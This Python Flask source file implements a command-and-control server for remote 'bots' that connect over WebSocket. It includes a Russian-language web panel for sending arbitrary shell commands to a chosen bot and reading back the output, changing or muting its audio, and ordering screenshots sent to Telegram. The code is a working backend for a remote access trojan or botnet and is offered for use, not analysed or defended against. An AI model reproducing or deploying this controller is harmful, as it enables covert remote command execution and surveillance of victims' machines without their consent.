import time
import threading
from flask import Flask, render_template_string, request, jsonify
from flask_sock import Sock

# --- Инициализация ---
app = Flask(__name__)
sock = Sock(app)

# --- Глобальные хранилища данных (без изменений) ---
bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}

# --- НОВЫЙ, ОПТИМИЗИРОВАННЫЙ HTML-ШАБЛОН ---
HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>body{font-family:monospace;background-color:#1a1a1a;color:#0f0;} .container{width:80%;margin:auto;} h1,h2{text-align:center;} table{width:100%;border-collapse:collapse;margin-bottom:20px;} th,td{border:1px solid #0f0;padding:8px;text-align:left;} .control-block{margin-top:20px;padding:15px;border:1px solid #0f0;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;} input[type="submit"], button{background-color:#0f0;color:#1a1a1a;padding:10px;border:none;cursor:pointer;margin-right:10px;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;} input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;}</style>
</head><body onload="document.getElementById('main_bot_select').dispatchEvent(new Event('change'))">
<div class="container"><h1>Панель управления v6</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}
    <!-- ЕДИНЫЙ БЛОК ВЫБОРА БОТА -->
    <div class="control-block"><h3>Цель</h3>
    <select id="main_bot_select" onchange="getCurrentVolume()">
        {% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}
    </select>
    </div>

    <!-- Блок выполнения команд -->
    <div class="control-block"><h3>Выполнение команд</h3>
    <input type="text" id="command_input" placeholder="Введите команду, например, whoami">
    <button onclick="sendShellCommand()">Отправить команду</button>
    </div>

    <!-- Блок управления звуком -->
    <div class="control-block"><h3>Управление звуком</h3>
    <label for="volume_slider">Громкость:</label><br>
    <input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br>
    <button onclick="sendControlCommand('mute')">Выключить звук (Mute)</button><button onclick="sendControlCommand('unmute')">Включить звук</button></div>

    <!-- Блок специальных команд -->
    <div class="control-block"><h3>Специальные команды</h3>
    <button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>

    <!-- Блок для вывода результатов -->
    <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>

{% else %}<p>Нет активных ботов.</p>{% endif %}
</div>

<!-- ОБНОВЛЕННЫЙ JAVASCRIPT -->
<script>
    const volumeSlider = document.getElementById('volume_slider');
    const volumeOutput = document.getElementById('volume_output');
    const resultOutput = document.getElementById('result_output_pre');
    const mainBotSelect = document.getElementById('main_bot_select');

    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });

    // Универсальная функция для отправки "тихих" команд (звук, скриншот)
    async function sendControlCommand(command) {
        const botId = mainBotSelect.value;
        if (!botId) return;
        const response = await fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) });
        const data = await response.json();
        if(data.status === 'ok' && command === 'screenshot') { resultOutput.textContent = 'Команда на создание скриншота отправлена...'; }
    }

    // Новая функция для отправки shell-команд и получения ответа
    async function sendShellCommand() {
        const botId = mainBotSelect.value;
        const command = document.getElementById('command_input').value;
        if (!botId || !command) return;
        resultOutput.textContent = 'Выполнение команды...'; // Показываем, что команда в процессе
        try {
            const response = await fetch('/api/shell_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bot_id: botId, command: command })
            });
            const data = await response.json();
            if(data.status === 'ok') { resultOutput.textContent = data.result; } 
            else { resultOutput.textContent = 'Ошибка: ' + data.message; }
        } catch (error) { resultOutput.textContent = 'Сетевая ошибка: ' + error; }
    }

    // Функция для получения текущей громкости (без изменений)
    async function getCurrentVolume() {
        const botId = mainBotSelect.value;
        if (!botId) return;
        try {
            const response = await fetch('/api/get_volume', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId }) });
            const data = await response.json();
            if (data.status === 'ok') {
                volumeSlider.value = data.volume;
                volumeOutput.value = data.volume + '%';
            }
        } catch (error) { console.error('Error getting volume:', error); }
    }
</script>
</body></html>
"""

# --- ОБНОВЛЕННЫЙ БЭКЕНД ---

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE, bots=bots)

# УДАЛЯЕМ СТАРЫЙ /command, ОН БОЛЬШЕ НЕ НУЖЕН

# Новый обработчик для shell-команд, который возвращает результат
@app.route('/api/shell_command', methods=['POST'])
def api_shell_command():
    data = request.get_json()
    bot_id, cmd = data.get('bot_id'), data.get('command')
    result_text = "Ошибка: бот не найден или отвалился."

    if bot_id and cmd and bot_id in bots:
        try:
            ws = bots[bot_id]
            # Очищаем старый результат
            if bot_id in command_results: del command_results[bot_id]
            ws.send(cmd)

            # Ждем ответа до 5 секунд
            for _ in range(50):
                if bot_id in command_results:
                    result_text = command_results.pop(bot_id, "Бот не ответил.")
                    return jsonify({'status': 'ok', 'result': result_text})
                time.sleep(0.1)

            return jsonify({'status': 'error', 'message': 'Бот не ответил за 5 секунд.'}), 408
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400

# Остальные API-обработчики без изменений
@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json()
    bot_id, cmd = data.get('bot_id'), data.get('command')
    if bot_id and cmd and bot_id in bots:
        try:
            bots[bot_id].send(cmd)
            return jsonify({'status': 'ok'})
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if bot_id in bots:
        try:
            events[bot_id] = threading.Event()
            bots[bot_id].send('getvolume')
            if events[bot_id].wait(timeout=3):
                level = volume_levels.get(bot_id, 50)
                return jsonify({'status': 'ok', 'volume': level})
            else: return jsonify({'status': 'timeout'}), 408
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'not_found'}), 404

# WebSocket-обработчик без изменений
@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    bots[bot_ip] = ws
    ws_map[ws] = bot_ip
    print(f"[+] Новый бот подключился: {bot_ip}")
    try:
        while True:
            result = ws.receive()
            current_bot_ip = ws_map.get(ws)
            if not current_bot_ip: continue
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                    if current_bot_ip in events and not events[current_bot_ip].is_set():
                        events[current_bot_ip].set()
            else:
                command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.get(ws, 'unknown')
        if dead_bot_ip != 'unknown':
            for d in [bots, ws_map, volume_levels, command_results, events]:
                if dead_bot_ip in d: del d[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip} отвалился.")

if __name__ == '__main__':
    print("Этот скрипт не предназначен для прямого запуска.")
